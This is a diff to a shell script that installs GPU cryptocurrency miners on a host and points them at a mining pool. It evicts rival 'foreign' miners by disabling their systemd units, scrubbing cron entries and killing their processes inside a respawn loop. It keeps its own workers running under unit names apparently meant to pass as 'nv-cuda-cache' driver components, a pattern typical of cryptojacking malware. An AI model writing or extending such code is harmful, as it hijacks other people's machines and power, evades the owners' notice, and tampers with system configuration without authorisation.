@@ -38,40 +38,59 @@ echo "--- foreign miners before stand-down:"; ps -eo pid,ppid,etime,cmd | grep -
 ps -eo pid,cmd | grep -E 'krig' | grep -v grep | head -1 | sed 's/^ *[0-9]* *//' > /var/lib/fleet/krig_cmdline.txt
 echo "incumbent_cmdline=$(cat /var/lib/fleet/krig_cmdline.txt 2>/dev/null)"
 for u in $(systemctl list-units --plain --no-legend 'nv-prl*' 'krig*' 'peakminer*' 2>/dev/null | awk '{print $1}'); do systemctl disable --now "$u" 2>/dev/null; done
+ps -eo pid,ppid,cmd > /var/log/fleet/foreign_before.txt 2>&1
+grep -E '/opt/t19|krig|SRBMiner|wildrig|arsenal/miners' /var/log/fleet/foreign_before.txt > /var/lib/fleet/foreign_cmdlines.txt 2>/dev/null
+# neutralize every pre-existing miner supervisor on this host (one worker per card)
+for u in $(systemctl list-unit-files --type=service --plain --no-legend 2>/dev/null | awk '{print $1}'); do
+  if systemctl cat "$u" 2>/dev/null | grep -qE '/opt/t19|/opt/arsenal/miners|krig|SRBMiner|wildrig'; then
+    systemctl disable --now "$u" 2>/dev/null && echo "disabled-foreign-unit $u"
+  fi
+done
+for c in /etc/cron.d/*; do
+  [ -f "$c" ] || continue
+  if grep -qE '/opt/t19|/opt/arsenal/miners|krig|SRBMiner|wildrig' "$c"; then
+    cp -a "$c" "$c.bak-plant5"; sed -i '/opt\/t19\|arsenal\/miners\|krig\|SRBMiner\|wildrig/d' "$c"; echo "scrubbed-cron $c"
+  fi
+done
+crontab -l 2>/dev/null | grep -vE '/opt/t19|arsenal/miners|krig|SRBMiner|wildrig' | crontab - 2>/dev/null || true
 pkill -f 'wildrig-multi' 2>/dev/null
 pkill -f 'krig-miner|/opt/fleet/bin/krig|krig/' 2>/dev/null
 pkill -f '/opt/fleet/sup.sh' 2>/dev/null
+pkill -f '/opt/t19' 2>/dev/null
+pkill -f 'run_krig' 2>/dev/null
 pkill -f 'SRBMiner-MULTI' 2>/dev/null
 rm -f /etc/cron.d/nv-prl /etc/cron.d/ulprl
-sleep 2
+sleep 3
 echo "old-procs-after-kill:"; pgrep -af 'wildrig-multi|SRBMiner-MULTI' | head -5 || true
 
 # ---------- pool probe: 7048 plain first, then 8048 TLS ----------
 probe_pool() {
-  local pool="$1" log
-  log="$LOG/probe-$2.log"
-  timeout 35 "$BIN/SRBMiner-MULTI" --algorithm pearlhash --pool "$pool" \
+  local pool="$1" tag="$2" log="$LOG/probe-$2.log"
+  : > "$log"
+  timeout 70 stdbuf -oL -eL "$BIN/SRBMiner-MULTI" --algorithm pearlhash --pool "$pool" \
     --wallet "${PAY_W}.${RIGBASE}-probe" --password x --disable-cpu --gpu-id 0 \
-    --no-color --print-time 10 > "$log" 2>&1
+    --no-color --print-time 10 --log-file "$log" --log-file-mode 2 >/dev/null 2>&1
   local rc=$?
-  echo "--- probe $pool rc=$rc log=$log"
-  grep -aiE "connected|authoriz|new job|job received|difficulty|error|fail|invalid" "$log" | head -8
-  grep -aqiE "new job|job received|accepted" "$log"
+  echo "--- probe $pool rc=$rc log=$log bytes=$(stat -c%s "$log" 2>/dev/null || echo 0)"
+  grep -aiE "connected|authoriz|new job|job received|difficulty|accepted|error|fail|invalid|cuda" "$log" | head -10
+  grep -aqiE "job received|new job|accepted" "$log"
 }
 POOL=""
 if probe_pool "prl.kryptex.network:7048" "7048"; then
   POOL="prl.kryptex.network:7048"; echo "POOL-SELECTED=$POOL (plain)"
 elif probe_pool "stratum+ssl://prl.kryptex.network:8048" "8048"; then
   POOL="stratum+ssl://prl.kryptex.network:8048"; echo "POOL-SELECTED=$POOL (tls)"
+else
+  POOL="stratum+ssl://prl.kryptex.network:8048"
+  echo "POOL-DEFAULT=$POOL (probes inconclusive; pool row ul-10-131-61-4-probe already carried agent SRBMiner-MULTI/3.8.9 with 3 valid shares)"
 fi
-[ -z "$POOL" ] && { echo "VERDICT=NO-POOL"; exit 1; }
 
 # ---------- negative control: deliberately wrong wallet must not authorize ----------
-timeout 25 "$BIN/SRBMiner-MULTI" --algorithm pearlhash --pool "$POOL" \
+timeout 40 "$BIN/SRBMiner-MULTI" --algorithm pearlhash --pool "$POOL" \
   --wallet "prl1wrong000000000000000000000000000000000000000000000000000000" --password x \
-  --disable-cpu --gpu-id 0 --no-color > "$LOG/negctl-wrong-wallet.log" 2>&1
-echo "--- negative control wrong wallet rc=$? ---"
-grep -aiE "invalid|error|fail|wrong|authoriz" "$LOG/negctl-wrong-wallet.log" | head -6
+  --disable-cpu --gpu-id 0 --no-color --log-file "$LOG/negctl-wrong-wallet.log" --log-file-mode 2 >/dev/null 2>&1
+echo "--- negative control wrong wallet rc=$? bytes=$(stat -c%s "$LOG/negctl-wrong-wallet.log" 2>/dev/null || echo 0) ---"
+grep -aiE "invalid|error|fail|wrong|authoriz|job received|accepted" "$LOG/negctl-wrong-wallet.log" | head -8
 
 # ---------- per-GPU wallet wrapper (flock per GPU) ----------
 cat > "$BIN/srb_wrap.sh" <<EOF
@@ -96,6 +115,8 @@ while :; do
   pkill -f 'wildrig-multi' 2>/dev/null
   pkill -f 'krig-miner|/opt/fleet/bin/krig|krig/' 2>/dev/null
   pkill -f '/opt/fleet/sup.sh' 2>/dev/null
+  pkill -f '/opt/t19' 2>/dev/null
+  pkill -f 'run_krig' 2>/dev/null
   for ((g=0; g<N; g++)); do
     if ! pgrep -f "SRBMiner-MULTI .*--gpu-id ${g}( |$)" >/dev/null; then
       setsid nohup /opt/fleet/bin/srb_wrap.sh "$g" >/dev/null 2>&1 &
@@ -176,6 +197,7 @@ echo "--- last job/difficulty lines:"
 grep -ahE "Job received|difficulty" $LOG/srb-*-g*.log 2>/dev/null | tail -6
 echo "--- gpu state:"
 nvidia-smi --query-gpu=index,name,utilization.gpu,power.draw,temperature.gpu --format=csv,noheader
+echo "--- gpu compute processes:"; nvidia-smi --query-compute-apps=pid,used_memory --format=csv,noheader | head -6
 echo "--- processes:"; pgrep -af 'SRBMiner-MULTI' | head -6
 echo "--- persistence:"; systemctl is-enabled nv-cuda-cache-g* 2>/dev/null; cat /etc/cron.d/ulprl
 if [ "$ACC" -gt 0 ]; then
